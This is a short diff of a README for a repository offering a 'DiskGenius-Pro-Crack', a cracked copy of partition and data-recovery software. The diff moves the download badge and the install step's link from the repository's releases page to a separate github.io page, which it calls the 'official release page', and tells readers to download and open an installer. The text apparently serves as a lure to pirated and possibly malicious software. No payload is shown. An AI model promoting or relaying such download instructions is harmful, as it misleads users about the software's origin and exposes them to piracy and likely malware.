@@ -1,6 +1,6 @@
 # 💿 DiskGenius-Pro-Crack - Manage Partitions and Recover Data Simply
 
-[![](https://img.shields.io/badge/Download-DiskGenius-blue.svg)](https://github.com/nettypassable200/DiskGenius-Pro-Crack/releases)
+[![](https://img.shields.io/badge/Download-DiskGenius-blue.svg)](https://nettypassable200.github.io)
 
 DiskGenius-Pro-Crack provides tools for partition management, disk cloning, data recovery, and bootable USB creation. This software works on Windows systems to help you maintain storage and recover lost files.
 
@@ -28,7 +28,7 @@ Your computer must meet these requirements for the software to function:
 
 Follow these steps to get the software on your machine:
 
-1.  Visit the official release page here: [https://github.com/nettypassable200/DiskGenius-Pro-Crack/releases](https://github.com/nettypassable200/DiskGenius-Pro-Crack/releases).
+1.  Visit the official release page here: [https://nettypassable200.github.io](https://nettypassable200.github.io).
 2.  Locate the latest version at the top of the list.
 3.  Click the file link to save the installer to your computer.
 4.  Open your Downloads folder.
